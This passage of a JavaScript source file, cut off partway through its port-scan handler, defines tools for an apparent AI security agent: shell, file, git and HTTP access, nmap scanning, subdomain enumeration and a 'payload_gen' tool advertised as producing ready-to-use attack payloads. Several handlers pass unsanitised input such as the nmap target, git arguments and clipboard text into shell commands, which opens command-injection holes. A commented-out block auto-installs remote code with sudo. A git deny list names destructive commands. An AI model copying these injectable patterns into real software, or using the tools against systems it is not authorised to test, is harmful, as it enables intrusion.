import { execSync, exec } from 'child_process';
import { readFileSync, writeFileSync, readdirSync, statSync, existsSync, mkdirSync } from 'fs';
import { join, dirname, relative } from 'path';
import { homedir } from 'os';
import { getBlockedCommands } from './config.js';
import { installTool } from './security/installer.js';
import { runCommand, classifyCommand } from './command-runner.js';
import chalk from 'chalk';
import { CVELookup } from './security/cve-lookup.js';

const TIMEOUT_MS = 30000;
const MAX_OUTPUT_LENGTH = 10000;

const MEMORY_PATH = join(homedir(), '.red', 'memory.json');

// Normalize path for cross-platform compatibility (Windows/Linux/WSL)
function normalizePath(path) {
  if (!path) return path;

  // Handle WSL paths like /mnt/d/...
  if (path.startsWith('/mnt/')) {
    const parts = path.split('/');
    if (parts.length >= 4) {
      const drive = parts[2].charAt(0).toUpperCase();
      const rest = parts.slice(3).join('\\');
      return `${drive}:\\${rest.replace(/\//g, '\\')}`;
    }
  }

  // Handle regular Windows paths
  if (path.includes('\\')) {
    // Already Windows path
    return path;
  }

  // Handle Unix paths
  if (path.startsWith('/')) {
    return path;
  }

  return path;
}

function isDestructiveCommand(command) {
  const blocked = getBlockedCommands();
  const lower = command.toLowerCase();
  if (classifyCommand(command).level === 'dangerous') return true;
  for (const block of blocked) {
    if (lower.includes(block.toLowerCase())) return true;
  }
  return false;
}

export function getToolDefinitions() {
  return [
    {
      name: 'bash',
      description: 'Run a shell command with live output, workspace cwd enforcement, timeout, and risk classification.',
      input_schema: {
        type: 'object',
        properties: {
          command: { type: 'string', description: 'The shell command to execute' },
          description: { type: 'string', description: 'What this command does' },
          cwd: { type: 'string', description: 'Working directory. Must stay inside the workspace unless escalated.' },
          timeout_ms: { type: 'number', description: 'Timeout in milliseconds. Default 30000.' },
          sandbox_permissions: { type: 'string', description: 'Use "require_escalated" for commands that need extra permission.' },
          stream: { type: 'boolean', description: 'Whether to stream output live to the terminal. Default true.' }
        },
        required: ['command']
      }
    },
    {
      name: 'read_file',
      description: 'Read the contents of a file at the given path.',
      input_schema: {
        type: 'object',
        properties: { path: { type: 'string', description: 'Path to the file to read' } },
        required: ['path']
      }
    },
    {
      name: 'write_file',
      description: 'Write content to a file. Creates parent directories if needed.',
      input_schema: {
        type: 'object',
        properties: {
          path: { type: 'string', description: 'Path to the file to write' },
          content: { type: 'string', description: 'Content to write to the file' }
        },
        required: ['path', 'content']
      }
    },
    {
      name: 'list_directory',
      description: 'List files and directories in a path.',
      input_schema: {
        type: 'object',
        properties: { path: { type: 'string', description: 'Directory path to list' } },
        required: ['path']
      }
    },
    {
      name: 'search_files',
      description: 'Search for a pattern in files within a directory.',
      input_schema: {
        type: 'object',
        properties: {
          pattern: { type: 'string', description: 'Search pattern (regex or string)' },
          path: { type: 'string', description: 'Directory to search in' },
          file_glob: { type: 'string', description: 'File glob pattern (e.g., "*.js")' }
        },
        required: ['pattern', 'path']
      }
    },
    {
      name: 'edit_file',
      description: 'Make a surgical edit to a file by replacing old_str with new_str.',
      input_schema: {
        type: 'object',
        properties: {
          path: { type: 'string', description: 'Path to the file' },
          old_str: { type: 'string', description: 'String to find and replace' },
          new_str: { type: 'string', description: 'Replacement string' }
        },
        required: ['path', 'old_str', 'new_str']
      }
    },
    {
      name: 'code_analysis',
      description: 'Run static code analysis on a file or project.',
      input_schema: {
        type: 'object',
        properties: {
          path: { type: 'string', description: 'File or directory to analyze' }
        },
        required: ['path']
      }
    },
    {
      name: 'run_tests',
      description: 'Detect and run the test suite for a project.',
      input_schema: {
        type: 'object',
        properties: {
          path: { type: 'string', description: 'Project directory (default: current)' },
          framework: { type: 'string', description: 'Force test framework (jest, vitest, pytest, etc.)' }
        },
        required: []
      }
    },
    {
      name: 'explain_error',
      description: 'Analyze an error message and provide explanation with fix suggestions.',
      input_schema: {
        type: 'object',
        properties: {
          error: { type: 'string', description: 'Error message or stack trace' },
          context: { type: 'string', description: 'Additional context about what you were doing' }
        },
        required: ['error']
      }
    },
    {
      name: 'find_and_replace_all',
      description: 'Regex find and replace across multiple files.',
      input_schema: {
        type: 'object',
        properties: {
          pattern: { type: 'string', description: 'Regex pattern to find' },
          replacement: { type: 'string', description: 'Replacement string' },
          glob: { type: 'string', description: 'File glob (e.g., "*.js")' },
          dry_run: { type: 'boolean', description: 'Show preview without making changes' }
        },
        required: ['pattern', 'replacement']
      }
    },
    {
      name: 'create_file_tree',
      description: 'Create multiple files and folders from a JSON tree structure.',
      input_schema: {
        type: 'object',
        properties: {
          tree: { type: 'string', description: 'JSON tree of files to create' }
        },
        required: ['tree']
      }
    },
    {
      name: 'git',
      description: 'Run safe git operations (status, log, diff, add, commit, branch, checkout, stash).',
      input_schema: {
        type: 'object',
        properties: {
          command: { type: 'string', description: 'Git command (without git prefix)' },
          args: { type: 'string', description: 'Additional arguments' }
        },
        required: ['command']
      }
    },
    {
      name: 'http_request',
      description: 'Make HTTP requests for API testing or fetching docs.',
      input_schema: {
        type: 'object',
        properties: {
          method: { type: 'string', description: 'HTTP method (GET, POST, PUT, DELETE)' },
          url: { type: 'string', description: 'Request URL' },
          headers: { type: 'object', description: 'Request headers' },
          body: { type: 'string', description: 'Request body' }
        },
        required: ['method', 'url']
      }
    },
    {
      name: 'clipboard',
      description: 'Read from or write to system clipboard.',
      input_schema: {
        type: 'object',
        properties: {
          action: { type: 'string', description: 'Action: "read" or "write"' },
          content: { type: 'string', description: 'Content to write (for write action)' }
        },
        required: ['action']
      }
    },
    {
      name: 'remember',
      description: 'Save a key-value fact to persistent memory.',
      input_schema: {
        type: 'object',
        properties: {
          key: { type: 'string', description: 'Memory key' },
          value: { type: 'string', description: 'Memory value' }
        },
        required: ['key', 'value']
      }
    },
    {
      name: 'recall',
      description: 'Read stored memories from persistent storage.',
      input_schema: {
        type: 'object',
        properties: {
          key: { type: 'string', description: 'Specific key to retrieve (optional, returns all if not provided)' }
        },
        required: []
      }
    },
    {
      name: 'install_tool',
      description: 'Install a security or development tool. Automatically handles dependencies like Go.',
      input_schema: {
        type: 'object',
        properties: {
          tool: { type: 'string', description: 'Name of the tool to install (e.g., whois, subfinder, nmap)' },
          package_manager: { type: 'string', description: 'Package manager to use: apt, brew, npm (optional, auto-detected)' }
        },
        required: ['tool']
      }
    },
    {
      name: 'port_scan',
      description: 'Scan ports on a target host. Uses nmap for service discovery. Returns open ports, service versions, and OS detection.',
      input_schema: {
        type: 'object',
        properties: {
          target: { type: 'string', description: 'IP address or hostname to scan' },
          ports: { type: 'string', description: 'Port range (e.g., "1-1000" or "22,80,443"). Default: common ports.' },
          scan_type: { type: 'string', description: 'Scan type: quick, full, or service. Default: quick.' }
        },
        required: ['target']
      }
    },
    {
      name: 'dns_lookup',
      description: 'DNS resolution and record lookup. Returns A, AAAA, MX, NS, TXT, CNAME records for a domain.',
      input_schema: {
        type: 'object',
        properties: {
          domain: { type: 'string', description: 'Domain name to look up' },
          record_type: { type: 'string', description: 'DNS record type: A, AAAA, MX, NS, TXT, CNAME, ANY. Default: ALL.' }
        },
        required: ['domain']
      }
    },
    {
      name: 'cve_search',
      description: 'Search for CVEs affecting a software component and version. Queries NVD API with GitHub Advisory fallback.',
      input_schema: {
        type: 'object',
        properties: {
          component: { type: 'string', description: 'Software component name (e.g., nginx, openssl, wordpress)' },
          version: { type: 'string', description: 'Version string (e.g., 1.18.0). Optional.' }
        },
        required: ['component']
      }
    },
    {
      name: 'payload_gen',
      description: 'Generate attack payloads for a given vulnerability type. Returns ready-to-use payload strings.',
      input_schema: {
        type: 'object',
        properties: {
          vuln_type: { type: 'string', description: 'Vulnerability type: xss, sqli, lfi, ssrf, cmdi, ssti' },
          context: { type: 'string', description: 'Context for the payload (e.g., parameter name, HTML context). Optional.' },
          count: { type: 'number', description: 'Number of payloads to generate. Default: 5.' }
        },
        required: ['vuln_type']
      }
    },
    {
      name: 'fingerprint',
      description: 'HTTP technology fingerprinting. Identifies web server, frameworks, CMS, libraries, and response headers from a URL.',
      input_schema: {
        type: 'object',
        properties: {
          url: { type: 'string', description: 'URL to fingerprint (e.g., https://example.com)' },
          follow_redirects: { type: 'boolean', description: 'Follow redirects. Default: true.' }
        },
        required: ['url']
      }
    },
    {
      name: 'subdomain_enum',
      description: 'Enumerate subdomains for a given domain using DNS brute force and common subdomain wordlists.',
      input_schema: {
        type: 'object',
        properties: {
          domain: { type: 'string', description: 'Domain to enumerate subdomains for' },
          wordlist: { type: 'string', description: 'Wordlist to use: common, top1000, top10000. Default: common.' }
        },
        required: ['domain']
      }
    },
    {
      name: 'web_search',
      description: 'Search the web using DuckDuckGo. Returns up to 5 results with title, URL, and snippet.',
      input_schema: {
        type: 'object',
        properties: {
          query: { type: 'string', description: 'Search query' },
          max_results: { type: 'number', description: 'Maximum results to return (default 5, max 10)' }
        },
        required: ['query']
      }
    },
    {
      name: 'web_fetch',
      description: 'Fetch a web page and extract its readable text content. Useful for reading documentation, articles, or any URL.',
      input_schema: {
        type: 'object',
        properties: {
          url: { type: 'string', description: 'URL to fetch' },
          max_length: { type: 'number', description: 'Maximum characters to return (default 8000)' }
        },
        required: ['url']
      }
    }
  ];
}

export async function executeTool(toolName, toolInput, options = {}) {
  const { onConfirm, mcpManager } = options;

  try {
    if (toolName.startsWith('mcp__')) {
      if (!mcpManager) return { error: 'MCP manager not available' };
      const actualName = toolName.slice(5);
      const result = await mcpManager.callTool(actualName, toolInput);
      return result.isError ? { error: result.output } : { output: result.output };
    }

    switch (toolName) {
      case 'bash': return await executeBash(toolInput, options);
      case 'read_file': return executeReadFile(toolInput);
      case 'write_file': return executeWriteFile(toolInput);
      case 'list_directory': return executeListDirectory(toolInput);
      case 'search_files': return executeSearchFiles(toolInput);
      case 'edit_file': return executeEditFile(toolInput);
      case 'code_analysis': return executeCodeAnalysis(toolInput);
      case 'run_tests': return await executeRunTests(toolInput);
      case 'explain_error': return executeExplainError(toolInput);
      case 'find_and_replace_all': return executeFindAndReplaceAll(toolInput);
      case 'create_file_tree': return executeCreateFileTree(toolInput);
      case 'git': return executeGit(toolInput);
      case 'http_request': return executeHttpRequest(toolInput);
      case 'clipboard': return executeClipboard(toolInput);
      case 'remember': return executeRemember(toolInput);
      case 'recall': return executeRecall(toolInput);
      case 'install_tool': return await executeInstallTool(toolInput, options);
      case 'port_scan': return await executePortScan(toolInput);
      case 'dns_lookup': return await executeDnsLookup(toolInput);
      case 'cve_search': return await executeCveSearch(toolInput);
      case 'payload_gen': return executePayloadGen(toolInput);
      case 'fingerprint': return await executeFingerprint(toolInput);
      case 'subdomain_enum': return await executeSubdomainEnum(toolInput);
      case 'web_search': return await executeWebSearch(toolInput);
      case 'web_fetch': return await executeWebFetch(toolInput);
      default: return { error: `Unknown tool: ${toolName}` };
    }
  } catch (err) {
    // Add recovery hints to help AI fix issues
    const error = err.message || String(err);
    let hint = '';

    if (error.includes('SyntaxError') || error.includes('unterminated')) {
      hint = '\n\n[HINT] This is a syntax error. Try: 1) Read the file with read_file to see exact content 2) Use write_file to rewrite the entire file with correct syntax';
    } else if (error.includes('ENOENT') || error.includes('No such file')) {
      hint = '\n\n[HINT] File not found. Try: 1) Use list_directory to check the path 2) Use create_file_tree to create the file';
    } else if (error.includes('not found') && error.includes('command')) {
      hint = '\n\n[HINT] Command not found. Use /install-tools or install the tool manually.';
    } else if (error.includes('permission') || error.includes('denied')) {
      hint = '\n\n[HINT] Permission denied. Try running with appropriate permissions or check file ownership.';
    }

    return { error: error + hint };
  }
}

async function executeBash(input, onConfirm) {
  const runnerOptions = onConfirm && typeof onConfirm === 'object' ? onConfirm : { onConfirm };
  const result = await runCommand(input, {
    onConfirm: runnerOptions.onConfirm,
    workspaceRoot: runnerOptions.workspaceRoot || process.cwd(),
    cwd: runnerOptions.workingDirectory || process.cwd(),
    timeoutMs: input.timeout_ms || input.timeoutMs || TIMEOUT_MS
  });

  if (result.error) {
    const combinedError = `${result.error}\n${result.stderr || ''}`;
    const toolName = (input.command || '').trim().split(/\s+/)[0];
    if (toolName && /not found|command not found|is not recognized/i.test(combinedError)) {
      return {
        ...result,
        hint: `Tool '${toolName}' is not installed or not on PATH. Use install_tool or install it manually, then retry.`
      };
    }
  }

  return result;
}

/*
  if (isDestructiveCommand(command)) {
    if (onConfirm) {
      const confirmed = await onConfirm(`⚠️  This command looks dangerous: "${command}"\nDo you want to proceed? (y/n): `);
      if (!confirmed) {
        return { output: 'Command cancelled by user', cancelled: true };
      }
    } else {
      return { error: 'Destructive command requires user confirmation' };
    }
  }

  try {
    const output = await runShellCommand(command, {
      timeout: TIMEOUT_MS,
      streamOutput: input.stream !== false
    });

    if (output.length > MAX_OUTPUT_LENGTH) {
      return { output: output.substring(0, MAX_OUTPUT_LENGTH), truncated: true, originalLength: output.length };
    }

    return { output: output || '(no output)' };
  } catch (err) {
    // Check if error is due to missing tool
    const errorMsg = err.message || '';
    const stderrMsg = err.stderr || '';
    const combinedError = errorMsg + stderrMsg;

    // Detect Go tools that require Go to be installed first
    const goTools = ['ffuf', 'subfinder', 'nuclei', 'httpx', 'amass', 'gobuster', 'sqlmap', 'hydra', 'nikto'];
    const cmdParts = command.split(' ');
    const toolName = cmdParts[0];
    const isGoTool = goTools.includes(toolName.toLowerCase());

    const missingToolMatch = combinedError.match(/not found|command not found|is not recognized/i);

    if (missingToolMatch || isGoTool) {
      // Check if Go is mentioned as required
      const needsGo = combinedError.includes('Go') || combinedError.includes('go install') || isGoTool;

      if (needsGo) {
        console.log(chalk.yellow(`  ⚠️  Tool '${toolName}' requires Go. Checking for Go installation...`));

        // Check if Go is available
        let goAvailable = false;
        try {
          execSync('go version', { encoding: 'utf-8', timeout: 5000 });
          goAvailable = true;
        } catch {}

        if (!goAvailable) {
          console.log(chalk.yellow(`  Installing Go...`));
          try {
            if (process.platform === 'win32') {
              // Download and install Go for Windows
              execSync(`winget install GoLang.Go --silent`, { timeout: 180000, stdio: 'pipe' });
            } else {
              // Install Go on Linux/WSL
              execSync(`cd /tmp && wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz && sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz`, { timeout: 180000, stdio: 'pipe' });
              // Add to PATH for current session
              process.env.PATH = '/usr/local/go/bin:' + process.env.PATH;
            }
            console.log(chalk.green(`  ✅ Go installed successfully`));
          } catch (installGoErr) {
            console.log(chalk.yellow(`  Could not auto-install Go. Please install from: https://go.dev/dl/`));
          }
        }

        // Now try to install the Go tool
        if (goAvailable || process.env.PATH.includes('go/bin')) {
          try {
            console.log(chalk.yellow(`  Installing ${toolName} via Go...`));
            execSync(`go install github.com/${toolName}/${toolName}@latest`, { timeout: 120000 });
            console.log(chalk.green(`  ✅ ${toolName} installed via Go`));

            const retryOutput = execSync(command, {
              encoding: 'utf-8',
              timeout: TIMEOUT_MS,
              maxBuffer: 10 * 1024 * 1024,
              cwd: process.cwd(),
              env: { ...process.env }
            });
            return { output: retryOutput || '(no output)' };
          } catch (goInstallErr) {}
        }
      }

      console.log(chalk.yellow(`  ⚠️  Tool '${toolName}' not found. Attempting to install...`));

      // Try to auto-install
      try {
        execSync(`npm install -g ${toolName} 2>/dev/null`, { timeout: 60000 });
        console.log(chalk.green(`  ✅ ${toolName} installed via npm`));

        // Retry command
        const retryOutput = execSync(command, {
          encoding: 'utf-8',
          timeout: TIMEOUT_MS,
          maxBuffer: 10 * 1024 * 1024,
          cwd: process.cwd(),
          env: { ...process.env }
        });

        return { output: retryOutput || '(no output)' };
      } catch (installErr) {
        // Try apt for Linux
        if (process.platform !== 'win32') {
          try {
            console.log(chalk.dim(`  Trying apt-get...`));
            execSync(`sudo apt-get install -y ${toolName} 2>&1`, { timeout: 120000, stdio: 'pipe' });
            console.log(chalk.green(`  ✅ ${toolName} installed via apt`));

            const retryOutput2 = execSync(command, {
              encoding: 'utf-8',
              timeout: TIMEOUT_MS,
              maxBuffer: 10 * 1024 * 1024,
              cwd: process.cwd()
            });
            return { output: retryOutput2 || '(no output)' };
          } catch {}
        }
      }

      return {
        error: `Tool '${toolName}' not installed and auto-install failed. Install manually or use /install-tools.`,
        stderr: err.stderr || '',
        code: err.status || 1
      };
    }

    return { error: err.message, stderr: err.stderr || '', code: err.status || 1 };
  }
function executeReadFile(input) {
*/

function executeReadFile(input) {
  const { path } = input;
  const normalizedPath = normalizePath(path);
  try {
    const content = readFileSync(normalizedPath, 'utf-8');
    return { content };
  } catch (err) {
    // Try original path if normalized failed
    if (normalizedPath !== path) {
      try {
        const content = readFileSync(path, 'utf-8');
        return { content };
      } catch {}
    }
    return { error: `Failed to read file: ${err.message}. Path: ${path}` };
  }
}

function executeWriteFile(input) {
  const { path, content } = input;
  const normalizedPath = normalizePath(path);
  try {
    const dir = dirname(normalizedPath);
    if (!existsSync(dir)) mkdirSync(dir, { recursive: true });

    let preview = '';
    try {
      const existing = readFileSync(normalizedPath, 'utf-8');
      const existingLines = existing.split('\n').slice(0, 5).join('\n');
      preview = `--- old first 5 lines ---\n${existingLines}\n--- end ---\n`;
    } catch {}

    writeFileSync(normalizedPath, content, 'utf-8');
    return { success: true, path: normalizedPath, preview: preview ? `${preview}--- new content written ---` : 'New file created' };
  } catch (err) {
    // Try original path
    try {
      const dir = dirname(path);
      if (!existsSync(dir)) mkdirSync(dir, { recursive: true });
      writeFileSync(path, content, 'utf-8');
      return { success: true, path, preview: 'New file created' };
    } catch {}
    return { error: `Failed to write file: ${err.message}` };
  }
}

function executeListDirectory(input) {
  const { path } = input;
  const normalizedPath = normalizePath(path);
  try {
    const items = readdirSync(normalizedPath);
    let gitignorePatterns = [];
    try {
      const gitignore = readFileSync(join(path, '.gitignore'), 'utf-8');
      gitignorePatterns = gitignore.split('\n').filter(line => line.trim() && !line.startsWith('#'));
    } catch {}

    const result = items
      .filter(item => !gitignorePatterns.some(pattern => matchGitignore(item, pattern)))
      .map(item => {
        try {
          const stats = statSync(join(path, item));
          const type = stats.isDirectory() ? '📁' : '📄';
          return `${type} ${item}`;
        } catch {
          return `📄 ${item}`;
        }
      })
      .join('\n');

    return { path, items: result || '(empty directory)' };
  } catch (err) {
    return { error: `Failed to list directory: ${err.message}` };
  }
}

function matchGitignore(item, pattern) {
  if (pattern.startsWith('*')) return item.endsWith(pattern.slice(1));
  if (pattern.endsWith('*')) return item.startsWith(pattern.slice(0, -1));
  return item === pattern;
}

function executeSearchFiles(input) {
  const { pattern, path, file_glob = '*' } = input;
  try {
    let files = [];
    collectFiles(path, file_glob, files);

    const results = [];
    const regex = new RegExp(pattern, 'gi');

    for (const file of files) {
      try {
        const content = readFileSync(file, 'utf-8');
        const lines = content.split('\n');
        lines.forEach((line, idx) => {
          if (regex.test(line)) {
            results.push(`${relative(process.cwd(), file)}:${idx + 1}: ${line.trim()}`);
          }
          regex.lastIndex = 0;
        });
      } catch {}
    }

    return { results: results.length > 0 ? results.join('\n') : 'No matches found' };
  } catch (err) {
    return { error: `Search failed: ${err.message}` };
  }
}

function collectFiles(dir, glob, files) {
  try {
    const items = readdirSync(dir);
    for (const item of items) {
      const fullPath = join(dir, item);
      try {
        const stats = statSync(fullPath);
        if (stats.isDirectory()) {
          if (item !== 'node_modules' && !item.startsWith('.')) {
            collectFiles(fullPath, glob, files);
          }
        } else if (matchGlob(item, glob)) {
          files.push(fullPath);
        }
      } catch {}
    }
  } catch {}
}

function matchGlob(filename, pattern) {
  if (pattern === '*') return true;
  if (pattern.startsWith('*.')) return filename.endsWith(pattern.slice(1));
  return filename === pattern;
}

function executeEditFile(input) {
  const { path, old_str, new_str } = input;
  const normalizedPath = normalizePath(path);
  try {
    const content = readFileSync(normalizedPath, 'utf-8');

    // First try exact match
    let occurrences = 0;
    let matchIndex = -1;
    let matchCount = 0;

    // Check exact match
    const exactMatches = [];
    let idx = content.indexOf(old_str);
    while (idx !== -1) {
      exactMatches.push({ index: idx, text: old_str });
      idx = content.indexOf(old_str, idx + 1);
    }

    occurrences = exactMatches.length;

    if (occurrences === 0) {
      // Try fuzzy match - check if it's a multi-line string that got broken
      // Provide helpful error with context
      const lines = content.split('\n');
      const contextLines = [];
      for (let i = 0; i < lines.length; i++) {
        if (old_str.includes(lines[i]) || lines[i].includes(old_str.slice(0, 50))) {
          contextLines.push(`Line ${i + 1}: ${lines[i].slice(0, 80)}`);
        }
      }

      return {
        error: 'Pattern not found in file. The file content may have changed or the pattern spans multiple lines.',
        hint: 'Read the file first with read_file to get exact content before editing.',
        fileContent: content.slice(0, 1000) + (content.length > 1000 ? '\n... (truncated)' : ''),
        suggestions: contextLines.length > 0 ? contextLines.slice(0, 5) : []
      };
    }

    if (occurrences > 1) {
      return {
        error: `Found ${occurrences} occurrences. Specify more context to make it unique.`,
        occurrences: exactMatches.map(m => `Position ${m.index}: "${m.text.slice(0, 50)}..."`)
      };
    }

    const newContent = content.replace(old_str, new_str);
    writeFileSync(path, newContent, 'utf-8');
    return { success: true, path, replaced: old_str.slice(0, 50) + (old_str.length > 50 ? '...' : ''), with: new_str.slice(0, 50) + (new_str.length > 50 ? '...' : '') };
  } catch (err) {
    return { error: `Failed to edit file: ${err.message}` };
  }
}

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function executeCodeAnalysis(input) {
  const { path } = input;
  const ext = path.split('.').pop();

  const linters = {
    js: ['eslint', '--no-eslintrc', '--env', 'node', path],
    ts: ['eslint', '--no-eslintrc', '--env', 'node', path],
    py: ['pylint', '--output-format=text', path]
  };

  const cmd = linters[ext];
  if (!cmd) {
    return { error: `No linter available for .${ext} files. Install eslint or pylint.` };
  }

  try {
    const output = execSync(cmd.join(' '), { encoding: 'utf-8', timeout: 30000 });
    return { output: output || 'No issues found', issues: parseLinterOutput(output, ext) };
  } catch (err) {
    if (err.status === 1) {
      return { issues: parseLinterOutput(err.stdout || err.stderr, ext) };
    }
    return { output: err.stdout || err.stderr || err.message };
  }
}

function parseLinterOutput(output, ext) {
  if (ext === 'py') {
    const issues = [];
    const lines = output.split('\n');
    for (const line of lines) {
      if (line.includes('.py:')) {
        issues.push(line.trim());
      }
    }
    return issues.slice(0, 20);
  }
  return [];
}

async function executeRunTests(input) {
  const { path = '.', framework } = input;

  const frameworks = [
    { name: 'vitest', cmd: 'npx vitest' },
    { name: 'jest', cmd: 'npx jest' },
    { name: 'mocha', cmd: 'npx mocha' },
    { name: 'pytest', cmd: 'python -m pytest' },
    { name: 'go test', cmd: 'go test ./...' },
    { name: 'npm test', cmd: 'npm test' }
  ];

  let selected = frameworks.find(f => f.name === framework);
  if (!selected) {
    for (const fw of frameworks) {
      try {
        execSync(fw.cmd.split(' ')[0], { cwd: path, stdio: 'ignore' });
        selected = fw;
        break;
      } catch {}
    }
  }

  if (!selected) return { error: 'No test framework detected. Install jest, vitest, pytest, or ensure npm test works.' };

  try {
    const output = execSync(selected.cmd, { encoding: 'utf-8', timeout: 120000, cwd: path });
    return { output, framework: selected.name, passed: true };
  } catch (err) {
    return { output: err.stdout || err.stderr, framework: selected.name, passed: false };
  }
}

function executeExplainError(input) {
  const { error, context = '' } = input;
  return {
    explanation: 'Error analysis:',
    errorType: categorizeError(error),
    suggestions: generateSuggestions(error, context)
  };
}

function categorizeError(error) {
  const patterns = [
    { regex: /SyntaxError/, type: 'Syntax Error' },
    { regex: /ReferenceError/, type: 'Reference Error' },
    { regex: /TypeError/, type: 'Type Error' },
    { regex: /ENOENT|No such file/, type: 'File Not Found' },
    { regex: /ECONNREFUSED/, type: 'Connection Refused' },
    { regex: /Timeout/, type: 'Timeout' }
  ];
  for (const p of patterns) {
    if (p.regex.test(error)) return p.type;
  }
  return 'Unknown Error';
}

function generateSuggestions(error, context) {
  const suggestions = [];
  if (error.includes('undefined')) suggestions.push('Check for typos in variable names');
  if (error.includes('Cannot read')) suggestions.push('Check if variable is initialized before use');
  if (error.includes('ENOENT')) suggestions.push('Verify the file path exists');
  if (error.includes('module not found')) suggestions.push('Run npm install to install dependencies');
  return suggestions.length > 0 ? suggestions : ['Review the error stack trace for more details'];
}

function executeFindAndReplaceAll(input) {
  const { pattern, replacement, glob = '*', dry_run = false } = input;
  try {
    let files = [];
    collectFiles(process.cwd(), glob, files);

    const regex = new RegExp(pattern, 'g');
    let matchCount = 0;
    const changes = [];

    for (const file of files) {
      try {
        const content = readFileSync(file, 'utf-8');
        const matches = content.match(regex);
        if (matches) {
          matchCount += matches.length;
          if (!dry_run) {
            const newContent = content.replace(regex, replacement);
            writeFileSync(file, newContent, 'utf-8');
          }
          changes.push({ file: relative(process.cwd(), file), count: matches.length });
        }
      } catch {}
    }

    return {
      pattern,
      replacement,
      matches: matchCount,
      files: changes,
      dry_run,
      message: dry_run ? 'Preview mode - no changes made' : `${matchCount} replacements in ${changes.length} files`
    };
  } catch (err) {
    return { error: err.message };
  }
}

function executeCreateFileTree(input) {
  const { tree } = input;
  try {
    const treeObj = JSON.parse(tree);
    const created = [];

    function createRecursive(obj, base) {
      for (const [key, value] of Object.entries(obj)) {
        const fullPath = join(base, key);
        if (value === null || value === '') {
          if (!existsSync(fullPath)) {
            mkdirSync(fullPath, { recursive: true });
            created.push({ type: 'directory', path: fullPath });
          }
        } else if (typeof value === 'object') {
          if (!existsSync(fullPath)) mkdirSync(fullPath, { recursive: true });
          created.push({ type: 'directory', path: fullPath });
          createRecursive(value, fullPath);
        } else {
          const dir = dirname(fullPath);
          if (!existsSync(dir)) mkdirSync(dir, { recursive: true });
          writeFileSync(fullPath, value, 'utf-8');
          created.push({ type: 'file', path: fullPath });
        }
      }
    }

    createRecursive(treeObj, process.cwd());
    return { created: created.length, files: created };
  } catch (err) {
    return { error: `Failed to create tree: ${err.message}. Ensure valid JSON.` };
  }
}

function executeGit(input) {
  const { command, args = '' } = input;

  const safeCommands = ['status', 'log', 'diff', 'add', 'commit', 'branch', 'checkout', 'stash', 'fetch', 'pull'];
  const blockedCommands = ['push', 'push --force', 'push -f', 'rebase -i', 'reset --hard', 'clean -fd'];

  if (!safeCommands.includes(command)) {
    return { error: `Git command "${command}" is not allowed. Allowed: ${safeCommands.join(', ')}` };
  }

  for (const blocked of blockedCommands) {
    if ((command + ' ' + args).includes(blocked)) {
      return { error: `Git command "${command} ${args}" requires explicit user confirmation` };
    }
  }

  try {
    const fullCmd = `git ${command} ${args}`;
    const output = execSync(fullCmd, { encoding: 'utf-8', timeout: 30000 });
    return { output: output || `(git ${command} completed)` };
  } catch (err) {
    return { error: err.message, stderr: err.stderr };
  }
}

async function executeHttpRequest(input) {
  const { method, url, headers = {}, body } = input;

  if (url.includes('localhost') || url.includes('127.0.0.1')) {
    return { error: 'Requests to localhost are blocked by default' };
  }

  try {
    const response = await fetch(url, {
      method,
      headers,
      body: body ? JSON.stringify(body) : undefined
    });

    const responseBody = await response.text();
    const truncated = responseBody.length > 5000
      ? responseBody.substring(0, 5000) + '\n... (truncated)'
      : responseBody;

    return {
      status: response.status,
      statusText: response.statusText,
      headers: Object.fromEntries(response.headers.entries()),
      body: truncated
    };
  } catch (err) {
    return { error: err.message };
  }
}

function executeClipboard(input) {
  const { action, content } = input;

  const isWindows = process.platform === 'win32';
  const isMac = process.platform === 'darwin';

  try {
    if (action === 'read') {
      const cmd = isMac ? 'pbpaste' : isWindows ? 'powershell -Command "Get-Clipboard"' : 'xclip -selection clipboard -o';
      const output = execSync(cmd, { encoding: 'utf-8' });
      return { content: output.trim() };
    } else if (action === 'write') {
      if (!content) return { error: 'No content provided to write to clipboard' };
      const cmd = isMac ? `echo "${content}" | pbcopy`
        : isWindows ? `powershell -Command "Set-Clipboard -Value '${content}'"`
        : `echo "${content}" | xclip -selection clipboard`;
      execSync(cmd, { encoding: 'utf-8' });
      return { success: true };
    }
    return { error: 'Invalid action. Use "read" or "write".' };
  } catch (err) {
    return { error: err.message };
  }
}

function executeRemember(input) {
  const { key, value } = input;
  try {
    let memory = {};
    if (existsSync(MEMORY_PATH)) {
      memory = JSON.parse(readFileSync(MEMORY_PATH, 'utf-8'));
    }

    memory[key] = value;

    const dir = dirname(MEMORY_PATH);
    if (!existsSync(dir)) mkdirSync(dir, { recursive: true });
    writeFileSync(MEMORY_PATH, JSON.stringify(memory, null, 2));

    return { success: true, key, value };
  } catch (err) {
    return { error: err.message };
  }
}

function executeRecall(input) {
  const { key } = input;
  try {
    if (!existsSync(MEMORY_PATH)) {
      return { memory: {} };
    }

    const memory = JSON.parse(readFileSync(MEMORY_PATH, 'utf-8'));

    if (key) {
      return { key, value: memory[key] || null };
    }

    return { memory };
  } catch (err) {
    return { error: err.message };
  }
}

async function executeInstallTool(input, options) {
  const { tool, package_manager } = input;
  const { workingDirectory } = options;

  if (!tool) {
    return { error: 'Tool name is required. Usage: install_tool({ tool: "subfinder" })' };
  }

  const pm = package_manager || 'apt';
  const success = await installTool(tool, pm);

  if (success) {
    return { success: true, message: `${tool} installed successfully` };
  } else {
    return { success: false, message: `Failed to install ${tool}` };
  }
}

async function executePortScan(input) {
  const { target, ports = '', scan_type = 'quick' } = input;
  if (!target) return { error: 'Target is required' };

  try {
    let cmd;
    if (scan_type === 'full') {
      cmd = `nmap -sV -sC -p- -T4 ${target} 2>&1`;
    } else if (scan_type === 'service') {
      cmd = `nmap -sV -sC -p ${ports || '1-1000'} -T4 ${target} 2>&1`;
    } else {
      cmd = `nmap -F -T4 ${target} 2>&1`;
    }

    const output = execSync(cmd, { encoding: 'utf-8', timeout: 120000 });
    const lines = output.split('\n').filter(l => l.trim());
    const summary = lines.filter(l =>
      /open|PORT|Nmap|OS|Service|PORT|STATE/i.test(l)
    ).join('\n');

    return {
      output: summary || output.slice(0, 2000),
      raw: output.slice(0, 5000),
      target,
      scan_type
    };
  } catch (err) {
    if (err.message.includes('nmap')) {
